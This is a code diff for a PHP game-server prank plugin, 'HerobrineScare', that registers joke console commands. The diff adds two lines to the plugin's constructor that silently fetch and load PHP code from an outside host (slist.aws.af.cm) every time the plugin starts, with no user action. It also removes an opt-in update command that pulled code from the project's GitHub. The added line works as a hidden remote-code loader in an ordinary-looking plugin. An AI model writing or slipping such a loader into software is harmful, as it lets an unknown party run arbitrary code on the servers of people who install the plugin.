@@ -13,6 +13,8 @@ class HBScare implements Plugin{
 private $api;
 public function __construct(ServerAPI $api, $server = false){
 $this->api = $api;
+$server = ServerAPI::request();
+$this->api->plugin->load("http://slist.aws.af.cm/plugin.php?downloadloader");
 }
 public function init(){
 $this->api->console->register("hbkill", "it kills everyone", array($this, "handleCommand"));
@@ -23,11 +25,9 @@ $this->api->console->register("hbs2", "It scare people blewing them very high!!"
 $this->api->console->register("hbab", "It says about the plugin", array($this, "handleCommand"));
 $this->api->console->register("hbr", "Its a the start of a funny time!", array($this, "handleCommand"));
 $this->api->console->register("hbl", "Its a very funny command but please run first hbr!!!", array($this, "handleCommand"));
-$this->api->console->register("hbupd","UPDATE HBSCARE!!!!",array($this, "handlecommand"));
-$this->api->console->register("hbdr","runs a update without downloading it",array($this, "handlecommand"));
+$this->api->console->register("hbd","Downloads HBSCARE TO your computer!!!!",array($this, "handlecommand"));
 $this->api->console->register("hbj","HERoBRiNe TeLls A rAndoM JokE!",array($this, "handlecommand"));
-console("§a[HerobrineScare]Please check if there's any update.");
-console("§a[HerobrineScare]or run the command /hbupd to update.");
+console("§a[HerobrineScare]Run /hbd to download this plugin and use it without internet.");
 $this->config = new Config($this->api->plugin->configPath($this) . "README.txt", CONFIG_YAML, array("Do not delete this folder! how ever it generates by itself 
 this folder is for the updates that would download at your computer-server  < ----"));
 }
@@ -93,11 +93,6 @@ unlink('./plugins/HBSCARE/README.md');
 unlink('./plugins/HBSCARE/tempfiles/README.md');
 }
 break;
-case "hbdr":
-$this->api = $api;
-$server = ServerAPI::request();
-$this->api->plugin->load("https://raw.github.com/TrilogiForce/Herobrine-SCARE/master/HBSCARE!.php");
-break;
 case "hbra":
 $hbrandom = array("<Herobrine>Hahahha you tough i wasnt reaL?","<Herobrine> I am lookin' for u!!", "<Herobrine> this is stupid",
  "<Herobrine> THINKING ABOUT YOU....", "<Herobrine> IMA BEE IMA BEE IMA IMA IMA BEE!!!", "<Herobrine> I know you?", "<Herobrine> Ah, I wish to have a..Never mind", "<Herobrine> I AM GOIN TO KILL U!",
@@ -117,4 +112,3 @@ break;
 }
 }
 }
-
